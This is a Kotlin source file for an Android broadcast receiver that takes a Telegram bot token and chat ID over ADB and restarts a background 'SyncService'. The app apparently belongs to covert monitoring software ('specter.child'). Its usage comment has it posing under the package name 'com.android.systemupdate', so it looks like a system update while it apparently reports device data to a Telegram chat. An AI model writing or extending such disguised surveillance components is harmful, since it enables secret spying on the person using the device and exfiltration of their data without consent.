package com.divine.specter.child.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.divine.specter.child.telegram.TelegramConfig

/**
 * Receiver for configuring Telegram bot via ADB.
 *
 * Usage:
 * adb shell am broadcast -a com.android.systemupdate.CONFIGURE_TELEGRAM \
 *   -n com.android.systemupdate/.receiver.TelegramConfigReceiver \
 *   --es bot_token "YOUR_BOT_TOKEN" \
 *   --es chat_id "YOUR_CHAT_ID" \
 *   --ez enabled true
 */
class TelegramConfigReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "TelegramConfigReceiver"
        const val ACTION_CONFIGURE = "com.android.systemupdate.CONFIGURE_TELEGRAM"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_CONFIGURE) return

        try {
            val botToken = intent.getStringExtra("bot_token")
            val chatId = intent.getStringExtra("chat_id")
            val enabled = intent.getBooleanExtra("enabled", true)

            if (botToken.isNullOrEmpty() || chatId.isNullOrEmpty()) {
                Log.e(TAG, "Missing bot_token or chat_id")
                return
            }

            TelegramConfig.configure(context, botToken, chatId, enabled)
            Log.i(TAG, "Telegram bot configured successfully")

            // Restart service to apply changes
            try {
                val serviceIntent = Intent(context, com.divine.specter.child.service.SyncService::class.java)
                context.stopService(serviceIntent)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
                Log.i(TAG, "Service restarted with Telegram bot")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart service", e)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Configuration error", e)
        }
    }
}
